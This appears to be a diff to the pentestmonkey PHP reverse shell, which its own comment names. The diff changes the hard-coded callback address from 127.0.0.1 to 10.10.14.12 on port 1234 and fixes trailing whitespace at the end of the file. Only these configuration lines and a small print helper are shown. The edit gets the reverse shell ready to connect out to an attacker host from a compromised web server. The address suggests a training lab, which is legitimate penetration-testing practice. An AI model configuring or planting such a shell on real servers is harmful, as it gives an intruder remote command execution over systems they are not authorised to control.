@@ -45,7 +45,7 @@
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
+$ip = '10.10.14.12';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
@@ -163,4 +163,4 @@ function printit ($string) {
 		print "$string\n";
 	}
 }
-?> 
+?>
